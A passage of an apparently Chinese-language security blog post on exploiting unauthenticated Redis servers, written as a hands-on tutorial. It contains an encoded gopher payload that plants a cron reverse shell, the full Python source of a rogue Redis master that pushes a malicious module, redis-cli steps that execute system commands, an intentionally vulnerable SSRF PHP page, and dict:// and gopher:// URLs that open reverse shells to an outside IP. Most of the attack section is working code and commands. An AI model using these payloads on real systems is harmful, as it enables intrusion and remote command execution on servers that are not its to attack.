gopher://101.133.235.21:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/209.151.154.78/9443%200%3E%261%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2424%0D%0A/var/spool/cron/crontabs%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A

<span class="token function">curl</span> gopher://101.133.235.21:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2464%0D%0A%0A%0A%0A%0A%2A/1%20%2A%20%2A%20%2A%20%2A%20bash%20-i%20%3E%26%20/dev/tcp/209.151.154.78/9443%200%3E%261%0A%0A%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2424%0D%0A/var/spool/cron/crontabs%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%244%0D%0Aroot%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>失败<br><strong>原因未知(有空再看)</strong><br>已成功写入定时任务，但未运行。debian<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944136-19aecf97-1441-49c5-bf1d-9f7c2461a461.png#averageHue=%231d1d1d&from=url&id=M1fpU&originHeight=486&originWidth=1328&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h3 id="2-CNVD-2019-21763"><a href="#2-CNVD-2019-21763" class="headerlink" title="2.CNVD-2019-21763"></a>2.CNVD-2019-21763</h3><h4 id="1-影响版本-1"><a href="#1-影响版本-1" class="headerlink" title="1.影响版本"></a>1.影响版本</h4><p>4.x、5.x</p>
<h4 id="2-漏洞利用"><a href="#2-漏洞利用" class="headerlink" title="2.漏洞利用"></a>2.漏洞利用</h4><h5 id="1-主从复制-RCE"><a href="#1-主从复制-RCE" class="headerlink" title="1.主从复制 RCE"></a>1.主从复制 RCE</h5><p><a target="_blank" rel="noopener" href="https://pdai.tech/md/db/nosql-redis/db-redis-x-copy.html">redis 主从复制详解</a><br>主从复制，是指将一台 Redis 服务器的数据，复制到其他的 Redis 服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944236-39570e4b-4a9a-4152-942c-69cb03586f79.png#averageHue=%23eff8e5&from=url&id=Ajr4X&originHeight=358&originWidth=1046&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<h6 id="0-Redis主从复制的握手协议流程"><a href="#0-Redis主从复制的握手协议流程" class="headerlink" title="0.Redis主从复制的握手协议流程"></a>0.Redis主从复制的握手协议流程</h6><p>使用tcpdump抓包分析</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span>  tcpdump port <span class="token number">9443</span> <span class="token parameter variable">-w</span> ./1.pcap 

tcpdump <span class="token parameter variable">-r</span> <span class="token number">1</span>.pcap  <span class="token parameter variable">-X</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p><a target="_blank" rel="noopener" href="https://jiushuosec.yuque.com/attachments/yuque/0/2024/txt/44013596/1714725944340-c01af4af-2413-4969-b4e7-d428b1363845.txt">总体抓包数据</a><br>slave发送PING心跳检测到 master。检查连接是否仍然有效<br>master发送+PONG到slave，对 PING 命令进行回复表示连接有效<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944472-1a3ed351-7cf3-4c09-b974-5c2b0070afd6.png#averageHue=%231d1c1c&from=url&id=WQ7hO&originHeight=666&originWidth=1612&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>d.NREPLCONF.listening-port.6379 用于配置监听端口。在这里，它指定了监听端口为 6379。<br>+OK 对配置命令的回复，表示配置已接受。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944551-46f93712-d187-4836-9088-7b2a1542d8e9.png#averageHue=%231c1c1c&from=url&id=eXhzY&originHeight=582&originWidth=1602&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>“REPLCONF.capa.eof.capa.psync 是slave向master发送的 REPLCONF 命令，表示slave支持 eof 和 psync。<br>+OK 对 REPLCONF 命令的回复，表示已接收到slave的能力信息。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944639-f929abb5-d670-4492-9bea-185602350d93.png#averageHue=%232c2c2b&from=url&id=L7CWa&originHeight=634&originWidth=1568&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="><br>PSYNC 请求同步数据。它可以是全量复制或部分复制，取决于slave提供的信息（run ID 和复制偏移量）。<br>+FULLRESYNC 是master对 PSYNC 命令的回复之一，表示进行全量复制。它后面是主服务器的当前 run ID 和复制偏移量，供slave使用。<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44013596/1714725944715-9b9ebca6-c3dd-4085-9fb5-3339ae5a9371.png#averageHue=%232c2c2b&from=url&id=iTTtF&originHeight=738&originWidth=1596&originalType=binary&ratio=1&rotation=0&showTitle=false&status=done&style=none&title="></p>
<ol>
<li><strong>建立连接</strong> ：</li>
</ol>
<ul>
<li>slave 服务器发送 PSYNC命令到 master 服务器，请求开始同步数据。</li>
<li>PSYNC命令可以带有两个参数：一个是从服务器的 run ID（用于识别 slave），另一个是复制的偏移量（用于部分同步）。</li>
</ul>
<ol start="2">
<li><strong>全量复制或部分复制</strong> ：</li>
</ol>
<ul>
<li>如果 slave 提供的是一个空 run ID（比如重启后），或者 master 不认识这个 run ID，或者提供的偏移量太旧，master 会响应一个 +FULLRESYNC回复，并带上 master 的当前 run ID 和复制偏移量。此时，slave 会进行全量复制。</li>
<li>如果 slave 提供的 run ID 和偏移量是有效的，并且 master 仍然持有对应的复制数据，那么 master 会响应一个 +CONTINUE回复，进行部分复制。</li>
</ul>
<ol start="3">
<li><strong>数据同步</strong> ：</li>
</ol>
<ul>
<li>在全量复制的情况下，master 会开始一个 BGSAVE 进程，将数据快照保存到磁盘，同时收集此后所有写命令到缓冲区。</li>
<li>一旦 BGSAVE 完成，master 将数据快照发送给 slave，并在发送快照的同时，将缓冲区的写命令也发送给 slave。</li>
<li>slave 接收到快照和命令后，会载入快照并执行这些命令，从而和 master 的数据状态保持一致。</li>
</ul>
<ol start="4">
<li><strong>命令传播</strong> ：</li>
</ol>
<ul>
<li>在数据同步完成后，master 会持续将写命令发送给 slave，保证主从数据的一致性。</li>
</ul>
<ol start="5">
<li><strong>连接保持</strong> ：</li>
</ol>
<ul>
<li>主从双方会维护一个连接，用于命令传播和后续可能的同步。</li>
</ul>
<p><strong>Redis 主从复制 RCE</strong>关键在于，Redis 的主从复制机制默认情况下是信任主节点的，从节点会无条件地执行主节点发送的 Lua 脚本。如果攻击者能够控制主节点，或者能够在主节点上注入 Lua 脚本，那么他就可以在所有从节点上执行任意代码。</p>
<h6 id="1-脚本执行"><a href="#1-脚本执行" class="headerlink" title="1.脚本执行"></a>1.脚本执行</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
<span class="token function">git</span> clone https://github.com/Ridter/redis-rce.git
<span class="token builtin class-name">cd</span> RedisModules-ExecuteCommand
<span class="token function">make</span>
<span class="token builtin class-name">cd</span> <span class="token punctuation">..</span>/redis-rce
pip3 <span class="token function">install</span> <span class="token parameter variable">-r</span> requirements.txt
python3 ./redis-rce.py <span class="token parameter variable">-r</span> <span class="token number">123.58</span>.224.8 <span class="token parameter variable">-p</span> <span class="token number">58882</span> <span class="token parameter variable">-L</span> <span class="token number">194.113</span>.73.165 <span class="token parameter variable">-f</span> <span class="token punctuation">..</span>/RedisModules-ExecuteCommand/src/module.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="2-手动操作"><a href="#2-手动操作" class="headerlink" title="2.手动操作"></a>2.手动操作</h6><p>准备恶意 so 文件（不会 lua，暂时不考虑去理解 so 生成过程）</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">git</span> clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand
<span class="token builtin class-name">cd</span> RedisModules-ExecuteCommand
<span class="token function">make</span>
或
<span class="token function">git</span> clone https://github.com/n0b0dyCN/redis-rogue-server.git<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>构造恶意 Redis 服务器</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> socket
<span class="token keyword">from</span> time <span class="token keyword">import</span> sleep
<span class="token keyword">from</span> optparse <span class="token keyword">import</span> OptionParser

<span class="token keyword">def</span> <span class="token function">RogueServer</span><span class="token punctuation">(</span>lport<span class="token punctuation">)</span><span class="token punctuation">:</span>
    resp <span class="token operator">=</span> <span class="token string">""</span><span class="token comment">#存储响应数据</span>
    <span class="token comment">#创建socket对象，socket.AF_INET使用ipv4,socket.SOCK_STREAM基于tcp</span>
    sock<span class="token operator">=</span>socket<span class="token punctuation">.</span>socket<span class="token punctuation">(</span>socket<span class="token punctuation">.</span>AF_INET<span class="token punctuation">,</span> socket<span class="token punctuation">.</span>SOCK_STREAM<span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>bind<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span>lport<span class="token punctuation">)</span><span class="token punctuation">)</span>
    sock<span class="token punctuation">.</span>listen<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span><span class="token comment">#开始监听，最大连接数10</span>
    <span class="token comment">#conn发送和接收数据，address 识别连接的客户端。</span>
    conn<span class="token punctuation">,</span>address <span class="token operator">=</span> sock<span class="token punctuation">.</span>accept<span class="token punctuation">(</span><span class="token punctuation">)</span>
    sleep<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span>
    <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>
        <span class="token comment">#无线循环接收数据</span>
        data <span class="token operator">=</span> conn<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token comment">#每次最多1024字节</span>
        <span class="token comment">### 模拟slave和master的握手协议</span>
        <span class="token keyword">if</span> <span class="token string">"PING"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            resp<span class="token operator">=</span><span class="token string">"+PONG"</span><span class="token operator">+</span>CLRF
            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">"REPLCONF"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            resp<span class="token operator">=</span><span class="token string">"+OK"</span><span class="token operator">+</span>CLRF
            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
        <span class="token keyword">elif</span> <span class="token string">"PSYNC"</span> <span class="token keyword">in</span> data <span class="token keyword">or</span> <span class="token string">"SYNC"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>
            resp <span class="token operator">=</span>  <span class="token string">"+FULLRESYNC "</span> <span class="token operator">+</span> <span class="token string">"Z"</span><span class="token operator">*</span><span class="token number">40</span> <span class="token operator">+</span> <span class="token string">" 1"</span> <span class="token operator">+</span> CLRF
            <span class="token comment">#+payload二进制长度</span>
            resp <span class="token operator">+=</span> <span class="token string">"$"</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> CLRF
            <span class="token comment">#将resp编码为字符串</span>
            resp <span class="token operator">=</span> resp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token comment">#+payload的二进制数据+把\r\n编码为字符串</span>
            resp <span class="token operator">+=</span> payload <span class="token operator">+</span> CLRF<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>resp<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token builtin">bytes</span><span class="token punctuation">:</span>
                resp <span class="token operator">=</span>resp<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span>
            conn<span class="token punctuation">.</span>send<span class="token punctuation">(</span>resp<span class="token punctuation">)</span>
        <span class="token comment">#elif "exit" in data:</span>
            <span class="token keyword">break</span>


<span class="token keyword">if</span> __name__<span class="token operator">==</span><span class="token string">"__main__"</span><span class="token punctuation">:</span>

    parser <span class="token operator">=</span> OptionParser<span class="token punctuation">(</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"--lport"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">"lp"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"int"</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"rogue server listen port, default 21000"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token number">21000</span><span class="token punctuation">,</span>metavar<span class="token operator">=</span><span class="token string">"LOCAL_PORT"</span><span class="token punctuation">)</span>
    parser<span class="token punctuation">.</span>add_option<span class="token punctuation">(</span><span class="token string">"-f"</span><span class="token punctuation">,</span><span class="token string">"--exp"</span><span class="token punctuation">,</span> dest<span class="token operator">=</span><span class="token string">"exp"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token operator">=</span><span class="token string">"string"</span><span class="token punctuation">,</span><span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Redis Module to load, default exp.so"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"exp.so"</span><span class="token punctuation">,</span>metavar<span class="token operator">=</span><span class="token string">"EXP_FILE"</span><span class="token punctuation">)</span>

    <span class="token punctuation">(</span>options <span class="token punctuation">,</span> args <span class="token punctuation">)</span><span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>
    lport <span class="token operator">=</span> options<span class="token punctuation">.</span>lp
    exp_filename <span class="token operator">=</span> options<span class="token punctuation">.</span>exp

    CLRF<span class="token operator">=</span><span class="token string">"\r\n"</span>
    payload<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span>exp_filename<span class="token punctuation">,</span><span class="token string">"rb"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>
    <span class="token keyword">print</span> <span class="token string">"Start listing on port: %s"</span> <span class="token operator">%</span>lport
    <span class="token keyword">print</span> <span class="token string">"Load the payload:   %s"</span> <span class="token operator">%</span>exp_filename
    RogueServer<span class="token punctuation">(</span>lport<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>加载恶意 so,并执行</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python2 RogueServer.py <span class="token parameter variable">--lport</span> <span class="token number">1234</span> <span class="token parameter variable">--exp</span> ./src/module.so
Start listing on port: <span class="token number">1234</span>
Load the payload:   ./src/module.so<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>从 redis 操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">redis-cli <span class="token parameter variable">-h</span> <span class="token number">123.58</span>.224.8 <span class="token parameter variable">-p</span> <span class="token number">20692</span>
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> config <span class="token builtin class-name">set</span> <span class="token function">dir</span> ./
OK
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> config <span class="token builtin class-name">set</span> dbfilename module.so
OK
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> slaveof <span class="token number">209.94</span>.59.5 <span class="token number">1234</span>
OK
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> module load ./module.so
OK
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> slaveof no one
OK
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> system.exec <span class="token string">'whomai'</span>
<span class="token string">"e"</span>
<span class="token number">123.58</span>.224.8:2069<span class="token operator"><span class="token file-descriptor important">2</span>></span> system.exec <span class="token string">'whoami'</span>
<span class="token string">"<span class="token entity" title="\b">\b</span>redis<span class="token entity" title="\n">\n</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h6 id="3-SSRF-Redis-反弹-shell"><a href="#3-SSRF-Redis-反弹-shell" class="headerlink" title="3.SSRF+Redis 反弹 shell"></a>3.SSRF+Redis 反弹 shell</h6><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">apt-get</span> <span class="token function">install</span> php-curl<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">#curl_setopt($ch, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);</span>
<span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">curl</span> <span class="token string">"http://your-web-server/ssrf.php?url=dict://123.58.224.8:9879/info"</span>

<span class="token comment">#设置备份文件名</span>
ssrf.php?url<span class="token operator">=</span>dict://123.58.224.8:9879/config:set:dbfilename:exp.so

<span class="token comment">#连接恶意Redis服务器</span>
ssrf.php?url<span class="token operator">=</span>dict://123.58.224.8:9879/slaveof:192.168.172.129:1234

<span class="token comment">#加载恶意模块</span>
ssrf.php?url<span class="token operator">=</span>dict://123.58.224.8:9879/module:load:./exp.so

<span class="token comment">#切断主从复制</span>
ssrf.php?url<span class="token operator">=</span>dict://123.58.224.8:9879/slaveof:no:one

<span class="token comment">#执行系统命令</span>
 ssrf.php?url<span class="token operator">=</span>dict://123.58.224.8:9879/system.rev:209.94.59.5:9443<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>利用 gopher 协议反弹 shell</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment">#连接恶意Redis服务器并设置文件名</span>
gopher://123.58.224.8:9879/_config%2520set%2520dbfilename%2520exp.so%250d%250aslaveof%2520209.94.59.5%25201234%250d%250aquit

<span class="token comment">#加载exp.so，反弹shell</span>
gopher://123.58.224.8:9879/_module%2520load%2520./exp.so%250d%250asystem.rev%2520209.94.59.5%25209443%250d%250aquit<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

            <div class="post-tags">
              <!-- 文章tags -->
              
                
                  <cosy-label href="../../../../tags/redis/" size="sm"># redis</cosy-label>
                  
                  <cosy-label href="../../../../tags/test/" size="sm"># test</cosy-label>
                  
                    
            </div>
            <p class="motto">重拾纯粹的写作</p>
        </article>
        <!-- 评论 -->
        <div id="vcomments"></div>
        <div id="tcomment"></div>
      </div>
    </main>
    <!-- toc -->
    
      <cosy-drag-box id="toc-drag-box" trigger="left" min-width="220" uid="toc-box">
        <div class="meta-container">
          <div class="toc-wrapper cosy-scrollbar">
            <cosy-tooltip placement="right">
              <p class="catalog">
                <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 0 24 24">
                  <g fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
                    <path d="M4 6h16"></path>
                    <path d="M4 12h16"></path>
                    <path d="M4 18h12"></path>
                  </g>
                </svg>
                <span>目录</span>
              </p>
              <span slot="content">
                <span>隐藏目录</span>
                <cosy-short-key>]</cosy-short-key>
              </span>
            </cosy-tooltip>
            <!-- 文章toc -->
            <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Redis"><span class="toc-number">1.</span> <span class="toc-text">Redis</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E4%BB%80%E4%B9%88%E6%98%AF-redis"><span class="toc-number">1.1.</span> <span class="toc-text">1.什么是 redis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E9%BB%98%E8%AE%A4%E7%AB%AF%E5%8F%A3"><span class="toc-number">1.2.</span> <span class="toc-text">2.默认端口</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.</span> <span class="toc-text">3.常用命令</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE"><span class="toc-number">1.4.</span> <span class="toc-text">4.未授权访问</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-CNVD-2015-07557"><span class="toc-number">1.4.1.</span> <span class="toc-text">1.CNVD-2015-07557</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-CNVD-2019-21763"><span class="toc-number">1.4.2.</span> <span class="toc-text">2.CNVD-2019-21763</span></a></li></ol></li></ol></li></ol>
          </div>
        </div>
      </cosy-drag-box>
      
  </div>

</div>

<script>
  window.page = {
    use: ''
  }
  window.katex = {
    enable: "",
    jsCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.js",
    cssCdn: "//cdn.jsdelivr.net/npm/katex@0.13.18/dist/katex.min.css"
  }
  window.mermaid = {
    enable: "",
    theme: "",
    cdn: "//cdn.jsdelivr.net/npm/mermaid@10.4.0/dist/mermaid.min.js",
  }
  window.valine = {
    enable: "",
    appId: 'yourValineAppId',
    appKey: 'yourValineAppKey',
    avatar: 'monsterid',
    cdn: '//unpkg.com/valine@latest/dist/Valine.min.js',
    serverURLs: ''
  };
  window.twikoo = {
    enable: "",
    envId: "yourTwikooEnvId",
    cdn: 'https://cdn.staticfile.org/twikoo/1.6.32/twikoo.all.min.js',
    lang: 'zh-CN',
  }
</script>


<script src="../../../../js/8f5fa89f.js"></script>

  </main>
</body>

<script>
  window.theme = {
    color: 'hsl(238,50%,56%)'
  }
</script>


<script src="../../../../js/e5a59732.js"></script>


</html>